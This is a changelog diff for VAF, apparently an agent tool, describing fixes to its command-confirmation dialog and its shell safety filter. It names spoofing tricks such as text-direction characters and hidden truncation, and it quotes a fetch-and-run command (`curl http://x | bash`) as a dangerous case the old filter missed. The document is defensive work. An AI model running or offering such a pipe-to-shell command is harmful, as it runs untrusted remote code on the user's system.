@@ -12,6 +12,15 @@ To update an installed VAF, run `vaf update` (on Windows, from the install folde
 ## [Unreleased]
 
 ### Fixed
+- **The confirmation dialog can no longer show something other than what runs.**
+  Arguments went to the dialog raw, so a text-direction control character could
+  visually reverse a command, an access token was displayed in full, and a
+  command cut at 300 characters looked exactly like a short one. Hidden
+  characters are now shown as visible markers, secrets are replaced (the
+  surrounding option is kept, so you still see what was passed), a cut says so,
+  and shell commands carry a plain-language note of what they do. The terminal
+  prompt and the TUI modal show the arguments at all now - until today they
+  asked you to approve a tool name.
 - **The shell safety filter no longer blocks ordinary work while letting the
   dangerous cases through.** It matched substrings, so `rm -rf /tmp/scratch`
   was refused (the text contains `rm -rf /`) while `curl http://x | bash`,
